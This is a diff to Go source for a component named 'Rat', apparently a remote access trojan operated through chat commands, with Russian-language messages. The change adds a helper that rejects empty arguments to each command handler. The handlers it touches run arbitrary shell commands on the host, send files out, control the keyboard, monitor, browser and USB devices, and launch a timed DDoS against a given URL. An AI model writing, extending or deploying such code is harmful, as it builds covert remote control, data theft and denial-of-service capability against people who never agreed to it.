@@ -20,6 +20,15 @@ func errToStatus(err error) string {
 	return err.Error()
 }
 
+func (r *Rat) validateFail(args string) bool {
+	if args == "" {
+		r.Transport.Send("Пожалуйста, убедитесь в правильности команды. /help для помощи")
+		return true
+	} else {
+		return false
+	}
+}
+
 func (r *Rat) commandsSwitch(text string) {
 	cmd, args := transport.ParseCommand(text)
 	switch cmd {
@@ -100,6 +109,10 @@ func (r *Rat) screenshotCmd() {
 }
 
 func (r *Rat) monitorCmd(args string) {
+	if r.validateFail(args) {
+		return
+	}
+
 	if args != "on" && args != "off" {
 		r.Transport.Send("Используйте /monitor [on|off]")
 		return
@@ -129,6 +142,10 @@ func (r *Rat) monitorCmd(args string) {
 }
 
 func (r *Rat) keyboardCmd(args string) {
+	if r.validateFail(args) {
+		return
+	}
+
 	cmd, arg := transport.ParseCommand(args)
 
 	var err error
@@ -153,6 +170,10 @@ func (r *Rat) keyboardCmd(args string) {
 }
 
 func (r *Rat) browserCmd(args string) {
+	if r.validateFail(args) {
+		return
+	}
+
 	err := r.Engine.Media.OpenBrowser(args)
 	if err != nil {
 		r.Transport.Send("Ошибка: %v", err)
@@ -211,6 +232,10 @@ func (r *Rat) usbListCmd() {
 }
 
 func (r *Rat) usbEnableCmd(args string) {
+	if r.validateFail(args) {
+		return
+	}
+
 	err := r.Engine.System.SetUSBDeviceState(args, true)
 	if err != nil {
 		r.Transport.Send("Ошибка: %v", err)
@@ -221,6 +246,10 @@ func (r *Rat) usbEnableCmd(args string) {
 }
 
 func (r *Rat) usbDisableCmd(args string) {
+	if r.validateFail(args) {
+		return
+	}
+
 	err := r.Engine.System.SetUSBDeviceState(args, false)
 	if err != nil {
 		r.Transport.Send("Ошибка: %v", err)
@@ -231,6 +260,10 @@ func (r *Rat) usbDisableCmd(args string) {
 }
 
 func (r *Rat) usbCmd(args string) {
+	if r.validateFail(args) {
+		return
+	}
+
 	cmd, arg := transport.ParseCommand(args)
 
 	switch cmd {
@@ -250,6 +283,10 @@ func (r *Rat) usbCmd(args string) {
 }
 
 func (r *Rat) cmdCmd(args string) {
+	if r.validateFail(args) {
+		return
+	}
+
 	out, err := r.Engine.System.Exec(args)
 	if err != nil {
 		r.Transport.Send("Ошибка: %v", err)
@@ -260,6 +297,10 @@ func (r *Rat) cmdCmd(args string) {
 }
 
 func (r *Rat) volumeCmd(args string) {
+	if r.validateFail(args) {
+		return
+	}
+
 	volume, err := strconv.Atoi(args)
 	if err != nil {
 		r.Transport.Send("Ошибка: аргумент должен быть числом от 0 до 100.")
@@ -284,8 +325,7 @@ func (r *Rat) infoCmd() {
 }
 
 func (r *Rat) sendFile(args string) {
-	if args == "" {
-		r.Transport.Send("Пожалуйста, укажите путь к файлу.")
+	if r.validateFail(args) {
 		return
 	}
 
@@ -305,6 +345,10 @@ func (r *Rat) sendFile(args string) {
 
 // /ddos [duration SEC] [url]
 func (r *Rat) ddosCmd(args string) {
+	if r.validateFail(args) {
+		return
+	}
+
 	dur, url := transport.ParseCommand(args)
 	duration, err := strconv.Atoi(dur)
 	if err != nil {
@@ -330,8 +374,7 @@ func (r *Rat) ddosCmd(args string) {
 }
 
 func (r *Rat) showCmd(args string) {
-	if args == "" {
-		r.Transport.Send("Пожалуйста, укажите путь к файлу.")
+	if r.validateFail(args) {
 		return
 	}
 
